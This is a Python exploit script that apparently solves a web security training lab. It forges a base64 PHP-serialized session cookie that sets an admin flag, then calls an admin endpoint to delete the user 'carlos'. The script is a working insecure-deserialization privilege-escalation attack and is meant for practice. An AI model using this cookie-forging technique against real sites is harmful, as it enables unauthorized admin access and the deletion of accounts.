import requests, sys, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}


def main():
    if len(sys.argv) != 2:
        print("[-] Wrong number of parameters")
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    s = requests.Session()

    # Delete user using the crafted cookie
    url_delete = url + '/admin/delete?username=carlos'
    cookies = {
        'session' : 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30='
    }

    r = s.get(url_delete, cookies=cookies, proxies=proxies, verify=False)
    
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Lab solved. User carlos deleted successfully")
        sys.exit(-1)
    else:
        print("[-] Impossible to delete user carlos")
        sys.exit(-1)


if __name__ == "__main__":
    main()